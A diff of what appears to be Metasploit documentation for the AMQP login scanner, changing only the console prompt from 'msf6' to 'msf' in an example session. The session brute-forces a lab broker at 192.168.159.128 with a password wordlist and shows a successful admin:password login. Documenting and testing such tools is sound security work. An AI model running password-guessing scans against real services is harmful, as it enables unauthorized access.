@@ -72,19 +72,19 @@ users can be added. The default credentials to login are `guest` / `guest`. A ne
 example.
 
 ```
-msf6 > use auxiliary/scanner/amqp/amqp_login 
-msf6 auxiliary(scanner/amqp/amqp_login) > set RHOSTS 192.168.159.128
+msf > use auxiliary/scanner/amqp/amqp_login 
+msf auxiliary(scanner/amqp/amqp_login) > set RHOSTS 192.168.159.128
 RHOSTS => 192.168.159.128
-msf6 auxiliary(scanner/amqp/amqp_login) > set USERNAME admin
+msf auxiliary(scanner/amqp/amqp_login) > set USERNAME admin
 USERNAME => admin
-msf6 auxiliary(scanner/amqp/amqp_login) > set PASS_FILE data/wordlists/unix_passwords.txt
+msf auxiliary(scanner/amqp/amqp_login) > set PASS_FILE data/wordlists/unix_passwords.txt
 PASS_FILE => data/wordlists/unix_passwords.txt
-msf6 auxiliary(scanner/amqp/amqp_login) > set RPORT 5672
+msf auxiliary(scanner/amqp/amqp_login) > set RPORT 5672
 RPORT => 5672
-msf6 auxiliary(scanner/amqp/amqp_login) > set SSL false
+msf auxiliary(scanner/amqp/amqp_login) > set SSL false
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => false
-msf6 auxiliary(scanner/amqp/amqp_login) > run
+msf auxiliary(scanner/amqp/amqp_login) > run
 
 [-] 192.168.159.128:5672 - LOGIN FAILED: admin:Password1! (Incorrect: ACCESS_REFUSED - Login was refused using authentication mechanism PLAIN. For details see the broker logfile.)
 [-] 192.168.159.128:5672 - LOGIN FAILED: admin:admin (Incorrect: ACCESS_REFUSED - Login was refused using authentication mechanism PLAIN. For details see the broker logfile.)
@@ -94,5 +94,5 @@ msf6 auxiliary(scanner/amqp/amqp_login) > run
 [+] 192.168.159.128:5672 - Login Successful: admin:password
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/amqp/amqp_login) > 
+msf auxiliary(scanner/amqp/amqp_login) > 
 ```
